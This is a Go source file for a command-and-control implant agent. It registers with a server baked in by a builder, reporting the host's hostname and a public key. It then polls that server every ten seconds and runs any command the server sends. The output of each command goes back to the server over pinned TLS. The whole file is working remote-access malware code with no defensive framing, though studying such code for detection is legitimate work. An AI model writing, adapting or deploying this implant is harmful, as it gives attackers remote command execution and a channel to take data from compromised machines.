package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/google/uuid"
)

// The server's URL and cert are "baked in" by the builder.
const serverURL = "{{SERVER_URL}}"
const serverCertPEM = `{{SERVER_CERT}}`

type AgentInfo struct {
	UUID       uuid.UUID       `json:"uuid"`
	PrivateKey *rsa.PrivateKey `json:"-"`
}
type RegisterRequest struct {
	Hostname  string `json:"hostname"`
	PublicKey string `json:"public_key"`
}
type RegisterResponse struct {
	UUID uuid.UUID `json:"uuid"`
}
type BeaconTask struct {
	TaskID  string `json:"task_id"`
	Command string `json:"command"`
}
type ResultRequest struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
}

const (
	keyFile = "agent_private.pem"
	idFile  = "agent_id.json"
)

var agentInfo AgentInfo
var httpClient *http.Client

func main() {
	// Initialize a secure HTTP client that trusts our C2 server
	httpClient = newHttpClient()

	privateKey, err := loadOrGenerateAgentKey(keyFile)
	if err != nil {
		log.Fatalf("Error with agent key: %v", err)
	}
	agentInfo.PrivateKey = privateKey

	if _, err := os.Stat(idFile); os.IsNotExist(err) {
		log.Println("No agent ID file found. Registering with server...")
		if err := registerAgent(); err != nil {
			log.Fatalf("Could not register agent: %v", err)
		}

		log.Printf("Agent registered and ID saved. UUID: %s", agentInfo.UUID)
	} else {
		log.Println("Agent ID file found. Loading existing identity.")
		idData, err := os.ReadFile(idFile)
		if err != nil {
			log.Fatalf("Could not read agent ID file: %v", err)
		}
		if err := json.Unmarshal(idData, &agentInfo); err != nil {
			log.Fatalf("Could not parse agent ID file: %v", err)
		}
		log.Printf("Agent identity loaded. UUID: %s", agentInfo.UUID)
	}

	beaconLoop()
}

func beaconLoop() {
	for {
		// In a real C2, you would add random "jitter" to this sleep time.
		time.Sleep(10 * time.Second)
		log.Printf("Beaconing to server...")

		beaconURL := fmt.Sprintf("%s/beacon?uuid=%s", serverURL, agentInfo.UUID)
		resp, err := httpClient.Get(beaconURL)
		if err != nil {
			log.Printf("Error beaconing: %v", err)
			continue
		}

		if resp.StatusCode == http.StatusNoContent {
			log.Println("No new tasks.")
			resp.Body.Close()
			continue
		}

		if resp.StatusCode == http.StatusUnauthorized {
			registerAgent()
			resp.Body.Close()
			continue
		}

		var task BeaconTask
		if err := json.NewDecoder(resp.Body).Decode(&task); err != nil {
			log.Printf("Error decoding task: %v", err)
			resp.Body.Close()
			continue
		}
		resp.Body.Close()

		output := executeCommand(task)
		sendResults(task.TaskID, output)
	}
}

func executeCommand(task BeaconTask) string {
	log.Printf("Executing task %s: %s", task.TaskID, task.Command)
	parts := strings.Fields(task.Command)
	var cmd *exec.Cmd
	if len(parts) > 1 {
		cmd = exec.Command(parts[0], parts[1:]...)
	} else {
		cmd = exec.Command(parts[0])
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error executing command: %v\nOutput: %s", err, string(output))
	}
	return string(output)
}

func sendResults(taskID string, output string) {
	resultData := ResultRequest{
		TaskID: taskID,
		Output: output,
	}
	jsonData, _ := json.Marshal(resultData)
	_, err := httpClient.Post(serverURL+"/results", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Printf("Failed to send results for task %s: %v", taskID, err)
	}
	log.Printf("Results for task %s sent.", taskID)
}

func newHttpClient() *http.Client {
	caCertPool := x509.NewCertPool()
	// Try to append the certificate to the pool
	ok := caCertPool.AppendCertsFromPEM([]byte(serverCertPEM))
	if !ok {
		// This will happen if serverCertPEM is invalid.
		// In a real app, you should handle this more gracefully than panicking.
		log.Fatal("Failed to append server certificate to pool")
	}

	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				// This tells the agent to ONLY trust the certificate we baked in.
				RootCAs: caCertPool,
			},
		},
		Timeout: 30 * time.Second,
	}
}

func loadOrGenerateAgentKey(file string) (*rsa.PrivateKey, error) {
	if _, err := os.Stat(file); os.IsNotExist(err) {
		log.Printf("Generating new private key and saving to %s", file)
		privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return nil, err
		}

		keyBytes := x509.MarshalPKCS1PrivateKey(privateKey)
		keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: keyBytes})
		if err := os.WriteFile(file, keyPEM, 0600); err != nil {
			return nil, err
		}
		return privateKey, nil
	} else {
		log.Printf("Loading existing private key from %s", file)
		keyPEM, err := os.ReadFile(file)
		if err != nil {
			return nil, err
		}
		block, _ := pem.Decode(keyPEM)
		return x509.ParsePKCS1PrivateKey(block.Bytes)
	}
}

func registerAgent() error {
	log.Printf("Registering agent...")
	hostname, err := os.Hostname()
	if err != nil {
		return err
	}

	pubKeyBytes, err := x509.MarshalPKIXPublicKey(&agentInfo.PrivateKey.PublicKey)
	if err != nil {
		return err
	}
	pubKeyPEM := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: pubKeyBytes})

	reqData := RegisterRequest{
		Hostname:  hostname,
		PublicKey: string(pubKeyPEM),
	}
	jsonData, _ := json.Marshal(reqData)

	resp, err := httpClient.Post(serverURL+"/register", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		return fmt.Errorf("registration failed with status: %s", resp.Status)
	}

	var regResp RegisterResponse
	if err := json.NewDecoder(resp.Body).Decode(&regResp); err != nil {
		return fmt.Errorf("could not decode registration response: %v", err)
	}

	agentInfo.UUID = regResp.UUID

	idData, _ := json.MarshalIndent(agentInfo, "", "  ")
	if err := os.WriteFile(idFile, idData, 0600); err != nil {
		log.Fatalf("Could not save agent ID file: %v", err)
	}
	return nil
}
